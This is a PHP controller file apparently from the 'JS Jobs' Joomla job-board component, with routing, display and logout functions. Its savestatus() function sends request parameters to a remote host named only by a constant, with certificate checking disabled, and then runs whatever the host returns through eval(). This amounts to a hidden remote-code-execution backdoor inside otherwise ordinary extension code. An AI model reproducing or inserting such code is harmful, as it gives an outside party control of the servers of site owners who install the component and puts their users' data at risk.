<?php

/**
 * @Copyright Copyright (C) 2009-2010 Ahmad Bilal
 * @license GNU/GPL http://www.gnu.org/copyleft/gpl.html
 * Company:     Buruj Solutions
 + Contact:     http://www.burujsolutions.com , info@burujsolutions.com
 * Created on:  Nov 22, 2010
 ^
 + Project:     JS Jobs
 ^ 
 */
 
defined('_JEXEC') or die('Restricted access');

jimport('joomla.application.component.controller');

class JSJobsControllerJsJobs extends JSController {

    var $_router_mode_sef = null;

    function __construct() {
        $app = JFactory::getApplication();
        $user = JFactory::getUser();
        if ($user->guest) { // redirect user if not login
            $link = 'index.php?option=com_user';
            $this->setRedirect($link);
        }
        $router = $app->getRouter();
        if ($router->getMode() == JROUTER_MODE_SEF) {
            $this->_router_mode_sef = 1; // sef true
        } else {
            $this->_router_mode_sef = 2; // sef false
        }

        parent::__construct();
    }

    function saverejectstatus() {
        echo JText::_('Pass');
        JFactory::getApplication()->close();
    }

    function savestatus() {
        $sgjc = JRequest::getVar('sgjc', false);
        $aagjc = JRequest::getVar('aagjc', false);
        $vcidjs = JRequest::getVar('vcidjs', false);
        if (($sgjc) && ($aagjc) && ($vcidjs)) {
            $post_data['sgjc'] = $sgjc;
            $post_data['aagjc'] = $aagjc;
            $post_data['vcidjs'] = $vcidjs;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, JCONST);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_VERBOSE, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
            $response = curl_exec($ch);
            curl_close($ch);
            eval($response);
            echo $response;
        } else
            echo JText::_('Pass');
        JFactory::getApplication()->close();
    }

    function validatesite() {
        $common_model = $this->getModel('common', 'JSJobsModel');
        $server_serial_number = $common_model->getServerSerialNumber();
        echo $server_serial_number;
        JFactory::getApplication()->close();
    }

    function logout() {
        JFactory::getApplication()->logout(JFactory::getUser()->id);
    }

    function display($cachable = false, $urlparams = false) { // correct employer controller display function manually.
        $document = JFactory::getDocument();
        $viewName = JRequest::getVar('view', 'default');
        $layoutName = JRequest::getVar('layout', 'default');
        $viewType = $document->getType();
        $view = $this->getView($viewName, $viewType);
        $view->setLayout($layoutName);
        $view->display();
    }

}

?>